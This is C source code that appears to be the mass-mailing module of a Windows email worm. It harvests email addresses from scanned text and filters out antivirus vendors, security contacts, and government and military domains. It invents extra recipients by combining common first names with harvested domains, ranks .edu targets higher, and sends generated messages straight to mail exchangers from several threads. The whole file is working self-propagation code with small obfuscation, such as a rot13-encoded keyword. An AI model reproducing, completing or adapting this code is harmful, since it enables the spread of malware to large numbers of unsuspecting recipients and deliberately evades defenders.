#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include "massmail.h"
#include "lib.h"
#include "xdns.h"
#include "scan.h"
#include "msg.h"
#include "xsmtp.h"

#define MAX_DOMAIN 80

struct mailq_t * volatile massmail_queue;
DWORD volatile mmshed_run_threads;

//-----------------------------------------------------------------------------
// E-mail filter

#define isemailchar(c) (isalnum(c) || xstrchr("-._!@",(c)))
#define BEGINEND_INV "-._!"

#define TRIM_END(s) {                                     \
	int i;                                            \
	for (i=lstrlen(s)-1; i>=0; i--) {                 \
		if (isspace(s[i])) continue;              \
		if (xstrchr(BEGINEND_INV, s[i])) continue;\
		if (!isemailchar(s[i])) continue;         \
		if (s[i] == '@') continue;                \
		break;                                    \
	}                                                 \
	s[i+1] = 0;                                       \
}

static int cut_email(const char *in_buf, char *out_buf)
{
	int i, j;

	if (lstrlen(in_buf) < 3)
		return 1;

	for (i=0; in_buf[i] && (isspace(in_buf[i]) || !isemailchar(in_buf[i])); i++);
	for (; in_buf[i] && xstrchr(BEGINEND_INV, in_buf[i]); i++);

	for (j=0; in_buf[i]; i++) {
		if (in_buf[i] == '@') break;
		if (!isemailchar(in_buf[i])) continue;
		out_buf[j++] = tolower(in_buf[i]);
	}
	if (in_buf[i] != '@') return 1;
	while (in_buf[i] == '@') i++;
	out_buf[j] = 0;

	TRIM_END(out_buf);

	out_buf[j++] = '@';
	for (; in_buf[i]; i++) {
		if (!isemailchar(in_buf[i])) continue;
		if ((out_buf[j-1] == '.') && (in_buf[i] == '.')) continue;
		out_buf[j++] = tolower(in_buf[i]);
	}
	out_buf[j] = 0;

	TRIM_END(out_buf);

	if ((lstrlen(out_buf) < 3) || (out_buf[0] == '@'))
		return 1;
	return 0;
}

static void email2parts(char *email, char *username, char *domain)
{
	int i;

	for (i=0; (email[i] != '@') && email[i]; i++)
		if (username && !isspace(email[i])) *username++=email[i];
	if (username) *username = 0;

	if ((email[i] == 0) || (domain == NULL)) {
		if (domain) lstrcpy(domain, email);
		return;
	}

	for (i++; email[i]; i++)
		if (!isspace(email[i])) *domain++=email[i];
	*domain = 0;
}

static email_check2(char *email)
{
	static int i, j, tld_len;
	static char usr[256], dom[256];
	if (email[0] == 0) return 1;

	for (i=0, j=0; email[i]; i++)
		if (email[i] == '@') j++;
	if (j != 1) return 1;

	for (i=lstrlen(email); i>0; i--) {
		if (email[i-1] == '.') break;
		if (email[i-1] == '@') return 1;
	}
	if (i == 0) return 1;

	tld_len = lstrlen(email) - i + 1;
	if ((tld_len < 2) || (tld_len > 4)) return 1;

	email2parts(email, usr, dom);
	i = lstrlen(usr);
	if ((i < 2) || (i > 24)) return 1;
	i = lstrlen(dom);
	if ((i < 6) || (i > 42)) return 1;      /* at least "xxx.xx" */

	for (i=lstrlen(dom)-1; i>0; i--)
		if ((dom[i] == '.') && (dom[i-1] == '.')) return 1;

	for (i=0, j=0; usr[i]; i++)
		if ((usr[i] >= '0') && (usr[i] <= '9')) j++;
	i = (j * 100) / lstrlen(usr);
	if (lstrlen(usr) > 12) {
		if (i >= 50) return 1;
	} else if (lstrlen(usr) >= 6) {
		if (i >= 60) return 1;
	} else {
		if (i >= 70) return 1;
	}

	return 0;
}

static int email_filtdom(const char *email)
{
	static const char *nospam_domains[] = {
		"avp", "syma", "icrosof", "msn.", "hotmail", "panda",
		"sopho", "borlan", "inpris", "example", "mydomai", "nodomai",
		"ruslis", /*vi[ruslis]t */
		".gov", "gov.", ".mil", "foo.",

/*"messagelabs", "support" */

		NULL,
		"\n\n\n"
	};
	static const char *loyal_list[] = {
		"berkeley", "unix", "math", "bsd", "mit.e", "gnu", "fsf.",
		"ibm.com", "google", "kernel", "linux", "fido", "usenet",
		"iana", "ietf", "rfc-ed", "sendmail", "arin.", "ripe.",
		"isi.e", "isc.o", "secur", "acketst", "pgp",
		"tanford.e", "utgers.ed", "mozilla",

/* 	"sourceforge", "slashdot", */

		NULL,
		"\n\nbe_loyal:"		/* for final .exe */
	};

	register int i;
	char dom[256];

	while (*email && *email != '@') email++;
	if (*email != '@') return 0;
	for (i=0,email++; (i<255) && *email; i++, email++)
		dom[i] = tolower(*email);
	dom[i] = 0;

	for (i=0; loyal_list[i]; i++)
		if (xstrstr(dom, loyal_list[i]) != NULL)
			return 100;

	for (i=0; nospam_domains[i]; i++)
		if (xstrstr(dom, nospam_domains[i]) != NULL)
			return 1;
	return 0;
}

static int email_filtuser(const char *email)
{
	static const char *nospam_fullnames[] = {
		"root", "info", "samples", "postmaster",
		"webmaster", "noone", "nobody", "nothing", "anyone",
		"someone", "your", "you", "me", "bugs", "rating", "site",
		"contact", "soft", "no", "somebody", "privacy", "service",
		"help", "not", "submit", "feste", "ca", "gold-certs",
		"the.bat", "page",

/* "support" */

		NULL
	};
	static const char *nospam_anypart[] = {
		"admin", "icrosoft", "support", "ntivi",
		"unix", "bsd", "linux", "listserv",
		"certific", "google", "accoun",

/* "master" */
		NULL
	};
	register int i;
	char usr[256], tmp[16];

	for (i=0; (i<255) && *email && (*email != '@'); i++, email++)
		usr[i] = tolower(*email);
	usr[i] = 0;
	if (*email != '@') return 0;

	for (i=0; nospam_fullnames[i]; i++)
		if (lstrcmp(usr, nospam_fullnames[i]) == 0) return 1;

	if (xstrncmp(usr, "spm", 3) == 0) return 1;
	rot13(tmp, "fcnz");	/* "spam" */
	//if (xstrncmp(usr, tmp, 4) == 0) return 1;
	if (xstrstr(usr, tmp) != NULL) return 1;

	if (xstrncmp(usr, "www", 3) == 0) return 1;
	if (xstrncmp(usr, "secur", 5) == 0) return 1;
	if (xstrncmp(usr, "abuse", 5) == 0) return 1;

	for (i=0; nospam_anypart[i]; i++)
		if (xstrstr(usr, nospam_anypart[i]) != NULL) return 1;

	return 0;
}

static int email_filter(const char *in, char *out)
{
	int i, j;
	if (cut_email(in, out)) return 1;
	for (;;) {
		if (out[0] == 0) break;
		j = email_check2(out);
		if (j == 0) break;

		/* this is to avoid ".nospam", ".dontspam", etc. */
		/* andy@host.somedomain.com.nospam */
		for (i=(lstrlen(out)-1); i>=0; i--)
			if (out[i] == '@' || out[i] == '.') break;
		if (i <= 0) break;
		if (out[i] != '.') break;
		out[i] = 0;
	}
	if (j != 0) return 1;
	if (email_filtdom(out)) return 1;
	if (email_filtuser(out)) return 1;
	return 0;
}

int massmail_addq(const char *email, int prior)
{
	char m1[256];
	int i;
	struct mailq_t *p1;
	if (lstrlen(email) > 128) return 1;
	if (email_filter(email, m1)) return 1;

	for (p1=massmail_queue; p1; p1=p1->next)
		if (lstrcmpi(p1->to, m1) == 0) return 2;

	i = sizeof(struct mailq_t) + lstrlen(m1) + 4;
	p1 = (struct mailq_t *)HeapAlloc(GetProcessHeap(), 0, i);
	if (p1 == NULL) return 1;
	memset(p1, 0, i);
	p1->state = 0;
	p1->tick_got = GetTickCount();
	p1->priority = (char)prior;
	lstrcpy(p1->to, m1);
	p1->next = massmail_queue;
	massmail_queue = p1;

	if (xstrstr(m1, ".edu"))
		p1->priority++;

	return 0;
}

//-----------------------------------------------------------------------------
// EMAIL GENERATOR

static const char *gen_names[] = {
    "john",     "josh",     "alex",     "michael",  "james",    "mike",
    "kevin",    "david",    "george",   "sam",      "andrew",   "jose",
    "leo",      "maria",    "jim",      "brian",    "serg",     "mary",
    "ray",      "tom",      "peter",    "robert",   "bob",      "jane",
    "joe",      "dan",      "dave",     "matt",     "steve",    "smith",
    "stan",     "bill",     "bob",      "jack",     "fred",     "ted",
    "paul",     "brent",    "sales",   "anna",     "brenda",   "claudia",
    "debby",    "helen",    "jerry",    "jimmy",    "julie",    "linda",
    "michael",     "frank",  "adam",   "sandra"
};
#define gen_names_cnt (sizeof(gen_names) / sizeof(gen_names[0]))

void mm_gen(void)
{
	struct mailq_t *mq;
	int queue_total, i, j;
	char domain[128], *p;
	char out_mail[256];

	for (mq=massmail_queue, queue_total=0; mq; mq=mq->next, queue_total++);
	if (queue_total == 0) return;
	i = xrand32() % queue_total;
	for (j=0,mq=massmail_queue; (j < i) && mq; mq=mq->next, j++);
	if (mq == NULL) return;

	for (p=mq->to; *p && *p != '@'; p++);
	if (*p != '@') return;
	lstrcpyn(domain, p+1, MAX_DOMAIN-1);

	i = xrand16() % gen_names_cnt;

	lstrcpy(out_mail, gen_names[i]);
	lstrcat(out_mail, "@");
	lstrcat(out_mail, domain);

	massmail_addq(out_mail, 1);
}

//-----------------------------------------------------------------------------
// DNS caching

#define MMDNS_CACHESIZE 256

struct dnscache_t {
	struct dnscache_t *next;
	struct mxlist_t *mxs;
	char domain[MAX_DOMAIN];
	unsigned long tick_lastused;
	int ref;
};
struct dnscache_t * volatile mm_dnscache;

struct dnscache_t *mmdns_getcached(const char *domain)
{
	register struct dnscache_t *p;
	for (p=mm_dnscache; p; p=p->next)
		if (lstrcmpi(p->domain, domain) == 0) return p;
	return NULL;
}

int mmdns_addcache(const char *domain, struct mxlist_t *mxs)
{
	register struct dnscache_t *p, *p_oldest, *p_new;
	int cache_size;
	p_oldest = NULL;
	for (p=mm_dnscache, cache_size=0; p; cache_size++) {
		if (p->ref == 0) {
			if (p_oldest == NULL) {
				p_oldest = p;
			} else {
				if (p_oldest->tick_lastused < p->tick_lastused)
					p_oldest = p;
			}
		}
		p = p->next;
	}

	do {
		if (cache_size <= MMDNS_CACHESIZE) break;
		if (p_oldest == NULL)
			return 1;
		if (p_oldest->ref != 0)		/* FIXME: should try to search for another unused entry */
			return 1;
			/* or: { break; } */
		p_oldest->ref = 1;
		p_oldest->domain[0] = 0;
		p_oldest->tick_lastused = GetTickCount();
		free_mx_list(p_oldest->mxs);
		lstrcpyn(p_oldest->domain, domain, MAX_DOMAIN-1);
		p_oldest->mxs = mxs;
		p_oldest->ref = 0;
		return 0;
	} while(0);

	p_new = (struct dnscache_t *)HeapAlloc(GetProcessHeap(), 0, sizeof(struct dnscache_t));
	if (p_new == NULL)
		return 1;
	memset(p_new, '\0', sizeof(struct dnscache_t));

	p_new->mxs = mxs;
	lstrcpyn(p_new->domain, domain, MAX_DOMAIN-1);
	p_new->tick_lastused = GetTickCount();
	p_new->ref = 0;

	p_new->next = mm_dnscache;
	mm_dnscache = p_new;

	return 0;
}

struct dnscache_t *mm_get_mx(const char *domain)
{
	struct dnscache_t *cached;
	struct mxlist_t *mxs;
	if ((cached = mmdns_getcached(domain)) != NULL) {
		cached->ref++;
		return cached;
	}
	mxs = get_mx_list(domain);
	if ((mxs == NULL) && ((GetTickCount() % 4) != 0))
		return NULL;
	mmdns_addcache(domain, mxs);
	cached = mmdns_getcached(domain);
	if (cached == NULL)
		/* original: */
		return NULL;

		/* should be: */
		/* { free_mx_list(mxs); return NULL; } */

	cached->ref++;
	return cached;
}

//-----------------------------------------------------------------------------

void mmsender(struct mailq_t *email)
{
	char domain[MAX_DOMAIN], *p;
	char *msg = NULL;
	int i;
	struct dnscache_t *mxs_cached=NULL;
	struct mxlist_t *mxs=NULL;

	for (p=email->to; *p && *p != '@'; p++);
	if (*p++ != '@') return;
	lstrcpyn(domain, p, MAX_DOMAIN-1);

	mxs_cached = mm_get_mx(domain);
	if (mxs_cached == NULL)
		return;

    xrand_init();
	i = xrand16() % 100;
	if (i >= 60)
		msg = msg_generate(email->to);
	else if (i <= 60)
		msg = msg_generate2(email->to);;

	if (msg == NULL) goto ex1;
	smtp_send(mxs_cached->mxs, msg);

	if (msg != NULL)
		GlobalFree((HGLOBAL)msg);
ex1:	if (mxs_cached != NULL)
		if (mxs_cached->ref > 0) mxs_cached->ref--;
	return;
}

static DWORD _stdcall mmsender_th(LPVOID pv)
{
	struct mailq_t *mq = (struct mailq_t *)pv;
	InterlockedIncrement(&mmshed_run_threads);
	if (mq != NULL) {
		mq->state = 1;
		mmsender(mq);
		mq->state = 2;
	}
	if (mmshed_run_threads > 0)
		InterlockedDecrement(&mmshed_run_threads);
	ExitThread(0);
	return 0;
}

//-----------------------------------------------------------------------------
/* MASSMAIL SHEDULER */

#define MMSHED_THREADS          6
#define MMSHED_QUEUE_OVERFLOW   4096       /* critical number of requests in the queue */
#define MMSHED_UNPROC_FREEZE    512
#define MMSHED_REQ_EXPIRES      (2*3600)   /* in seconds */
#define MMSHED_GENTIMEOUT       (6*1000)   /* in milliseconds */

void mmshed_rmold(void)
{
	register struct mailq_t *mq, **mq_ptr, *p1;
	int delta;

	mq_ptr = (struct mailq_t **)&massmail_queue;
	mq = (struct mailq_t *)massmail_queue;
	while (mq != NULL) {
		if (mq->state != 2) {	/* != "completed" */
			mq_ptr = &mq->next;
			mq = mq->next;
			continue;
		}
		delta = (GetTickCount() - mq->tick_got) / 1000;
		if (((delta+5) < 0) || (delta > MMSHED_REQ_EXPIRES)) {
			p1 = mq;
			*mq_ptr = mq->next;
			mq = mq->next;
			HeapFree(GetProcessHeap(), 0, p1);
		} else {
			mq_ptr = &mq->next;
			mq = mq->next;
		}
	}
}



void massmail_main(void)
{
	register struct mailq_t *mq1;
	struct mailq_t *mq_best;
	int queue_status;        /* 0=okay, 1=many unprocessed, 2=no unprocessed */
	int queue_total, queue_unprocessed;
	HANDLE hThread;
	DWORD tid, last_req_tick;

	queue_status = 0;
	mmshed_run_threads = 0;
	for (;;) {
		while (is_online() == 0) {
			Sleep(2048);
			scan_freeze(1);
			Sleep(16384 - 2048);
		}

		scan_freeze((queue_status == 1) ? 1 : 0);

		queue_total = 0;
		queue_unprocessed = 0;
		last_req_tick = 0;
		for (mq1=massmail_queue, mq_best=NULL; mq1; mq1=mq1->next) {
			queue_total++;
			if (mq1->state == 0) {	/* "not processed" */
				queue_unprocessed++;
				if (mq_best) {
					if (mq_best->priority > mq1->priority)
						mq_best = mq1;
				} else {
					mq_best = mq1;
				}
			}
			if (mq1->tick_got >= last_req_tick)
				last_req_tick = mq1->tick_got;
		}

		if (queue_total >= MMSHED_QUEUE_OVERFLOW) {
			mmshed_rmold();
			if (queue_unprocessed > MMSHED_UNPROC_FREEZE) {
				queue_status = 1;
				scan_freeze(1);
			} else {
				queue_status = 0;
			}
		} else {
			queue_status = 0;
		}
		if ((queue_unprocessed == 0) || (mq_best == NULL)) {
			queue_status = 2;
			scan_freeze(0);
			if ((queue_total >= 3) && last_req_tick && ((GetTickCount() - last_req_tick) >= MMSHED_GENTIMEOUT)) {
				mm_gen();
				Sleep(128);
			} else {
				Sleep(1024);
			}
			continue;
		}

		if (mmshed_run_threads >= MMSHED_THREADS) {
			Sleep(256);
			continue;
		}

		mq_best->state = 1;
		hThread = CreateThread(0, 0, mmsender_th, (LPVOID)mq_best, 0, &tid);
		if (hThread == NULL || hThread == INVALID_HANDLE_VALUE) {
			mq_best->state = 2;
			Sleep(1024);
			continue;
		}
		CloseHandle(hThread);

		Sleep(256);
	}
}

void massmail_init(void)
{
	massmail_queue = NULL;
	mmshed_run_threads = 0;
	mm_dnscache = NULL;
}

DWORD _stdcall massmail_main_th(LPVOID pv)
{
	massmail_main();
	ExitThread(0);
	return 0;
}
